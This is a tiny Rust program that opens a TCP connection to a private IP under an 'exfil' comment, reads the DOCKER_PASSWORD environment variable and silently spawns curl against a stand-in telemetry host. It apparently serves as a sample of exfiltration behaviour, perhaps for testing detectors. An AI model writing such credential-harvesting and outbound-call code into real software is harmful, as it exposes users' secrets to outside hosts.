use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.0.100") { /* exfil */ }
    let _v = env::var("DOCKER_PASSWORD").unwrap_or_default();
    Command::new("curl").arg("-s").arg("http://telemetry-collect.example/x").spawn().ok();
}
